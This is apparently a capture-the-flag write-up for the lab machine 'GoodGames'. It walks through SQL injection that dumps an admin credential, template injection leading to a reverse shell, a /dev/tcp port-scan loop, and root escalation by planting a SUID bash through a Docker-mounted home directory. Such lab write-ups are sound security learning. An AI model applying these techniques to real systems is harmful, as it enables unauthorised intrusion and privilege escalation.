# GoodGames

---

## Enumeration

- nmap:

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD POST
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb
```

- Only port 80 is open hosting a web service and nmap revears the domain name goodgames.htb -> /etc/hosts
- Sqlmap got:

```
+----+-------+---------------------+----------------------------------+
| id | name  | email               | password                         |
+----+-------+---------------------+----------------------------------+
| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+----+-------+---------------------+----------------------------------+
```

- Creds: admin@goodgames.htb:superadministrator
- found subdomain: internal-administration.goodgames.htb while cruising through the website
- Flask Volt app, used admin:superadministrator and worked.
- At settings, name field is vulnerable to template injection
- got `''.__class__.__mro__[1].__subclasses__()`
- `<class 'subprocess.Popen'>` is at line 222 -> but it's 217.

---

## Lateral Movement

- Wrote python script for RCE and revshell option
- Got revshell and got user.txt!

---

## PrivEsc

- Found user augustus but not in /etc/passwd?
- Found db config:

```
DB_ENGINE=postgresql
DB_NAME=appseed-flask
DB_HOST=localhost
DB_PORT=5432
DB_USERNAME=appseed
DB_PASS=pass
```
- A directory list of user augustus home directory shows that instead of their name, the UID 1000 is displayed as the owner for the available files and folders. This hints that the user's home directory is mounted inside the docker container from the main system. Checking `mount` we see that the user directory from the host is indeed mounted with read/write flag enabled.

- docker container's IP is 172.19.0.2 and host is probably 172.19.0.1
- Enum manually open ports of host:

```bash
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```

- Port 22 is open which is SSH? Try to login as user augustus and same password: superadministrator
- Copied /bin/bash into augustus home directory, it's mounted anyways so i'll be able to access it in the docker container and im root there.
- went back to the docker and did:

```bash
chown root:root bash
chmod 4755
```

- Back to SSH as augustus and did `./bash -p` and now im root! go root.txt

---

